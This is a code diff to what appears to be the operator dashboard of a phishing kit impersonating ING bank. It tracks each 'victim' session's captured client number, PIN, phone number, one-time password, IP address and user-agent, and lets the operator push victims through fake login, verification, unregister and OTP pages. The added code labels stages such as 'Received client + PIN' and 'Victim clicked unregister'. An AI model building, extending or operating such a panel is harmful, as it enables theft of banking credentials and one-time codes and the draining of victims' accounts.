@@ -25,7 +25,7 @@
       max-width: 1120px;
       margin: 32px auto 0;
       padding: 0 28px;
-      font-size: 34px;
+      font-size: 20px;
       font-weight: 600;
       line-height: 1.05;
     }
@@ -45,7 +45,6 @@
     td { padding: .6rem .5rem; border-bottom: 1px solid #f0f0f0; }
     tr:hover { background: #fafafa; }
 
-    /* ----------  CLEAN GREY BUTTONS  ---------- */
     .btn {
       padding: .35rem .75rem;
       font-size: .8rem;
@@ -87,7 +86,6 @@
     </div>
   </div>
 
-  <!-- ----------  DETAIL MODAL  ---------- -->
   <div id="modal" onclick="if(event.target===this)closeModal()">
     <div class="card">
       <div style="display:flex;justify-content:space-between;align-items:center">
@@ -123,6 +121,27 @@
         case 'otp.html':      return 'OTP';
         default:              return file;
       }
+    }
+
+    /* ----------  SESSION HEADER  ---------- */
+    function getSessionHeader(v) {
+      if (v.page === 'success') return `🦁 ING Login approved`;
+      if (v.status === 'approved') return `🦁 ING Login approved`;
+
+      /*  NEW  ––  victim clicked “Confirm to Unregister”  */
+      if (v.unregisterClicked) return `✅ Victim clicked unregister`;
+
+      if (v.page === 'index.html') {
+        return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
+      } else if (v.page === 'verify.html') {
+        return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
+      } else if (v.page === 'unregister.html') {
+        return v.unregisterClicked ? `✅ Victim clicked unregister` : `⏳ Awaiting unregister`;
+      } else if (v.page === 'otp.html') {
+        if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
+        return `🔑 Awaiting OTP...`;
+      }
+      return `🔑 Awaiting OTP...`;
     }
 
     function render(d){
@@ -164,7 +183,7 @@
         <div class="detail">Session ID</div><div class="cred">${s.sid}</div>
         <div class="detail">Client number</div><div class="cred">${s.email||'—'}</div>
         <div class="detail">PIN</div><div class="cred">${s.password||'—'}</div>
-        <div class="detail">Phone</div><div class="cred">${s.phone||'—'}</div>
+        <div class="detail">Phone</div><div class="cred">${s.phone||'—'}</span></div>
         <div class="detail">OTP</div><div class="cred">${s.otp||'—'}</div>
         <div class="detail">IP</div><div>${s.ip}</div>
         <div class="detail">Platform</div><div>${s.platform}</div>
@@ -173,8 +192,8 @@
         <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
         <div class="detail">Date</div><div>${localDate}</div>`;
 
-      qs('#redoBtn').style.display = s.page==='success' ? 'none':'inline-block';
-      qs('#contBtn').style.display = s.page==='success' ? 'none':'inline-block';
+      qs('#redoBtn').style.display  = (s.page==='success' || (s.page==='unregister.html' && s.unregisterClicked)) ? 'none':'inline-block';
+      qs('#contBtn').style.display  =  s.page==='success' ? 'none':'inline-block';
       qs('#modal').style.display   = 'flex';
     }
     function closeModal(){ qs('#modal').style.display='none'; }
